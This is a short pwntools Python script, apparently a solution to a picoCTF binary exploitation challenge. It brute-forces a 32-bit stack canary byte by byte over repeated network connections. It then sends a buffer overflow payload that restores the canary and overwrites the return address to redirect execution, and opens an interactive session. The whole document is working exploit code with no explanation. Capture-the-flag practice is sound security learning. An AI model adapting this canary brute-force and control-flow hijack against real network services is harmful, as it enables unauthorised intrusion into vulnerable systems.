from pwn import *
context.log_level='debug'

io = remote('saturn.picoctf.net', 52302)

canary = [0, 0, 0, 0]

def get_payload(i, j):
	ret = cyclic(64)
	for k in range(j):
		ret += p8(canary[k])
	return ret + p8(i)

for j in range(4):
	for i in range(255):
		io.sendlineafter(b'> ', str(65 + j).encode())
		io.sendlineafter(b'Input> ', get_payload(i, j))
		if b'***** Stack Smashing Detected *****' in io.recv():
			io = remote('saturn.picoctf.net', 52302)
		else:
			canary[j] = i
			break
	io = remote('saturn.picoctf.net', 52302)

canary_value = canary[0] + (canary[1] << 8) + (canary[2] << 16) + (canary[3] << 24)
io.sendlineafter(b'> ', str(64 + 4 + 16 + 4).encode())
io.sendlineafter(b'Input> ', cyclic(64) + p32(canary_value) + cyclic(16) + p32(0x8049336))

io.interactive()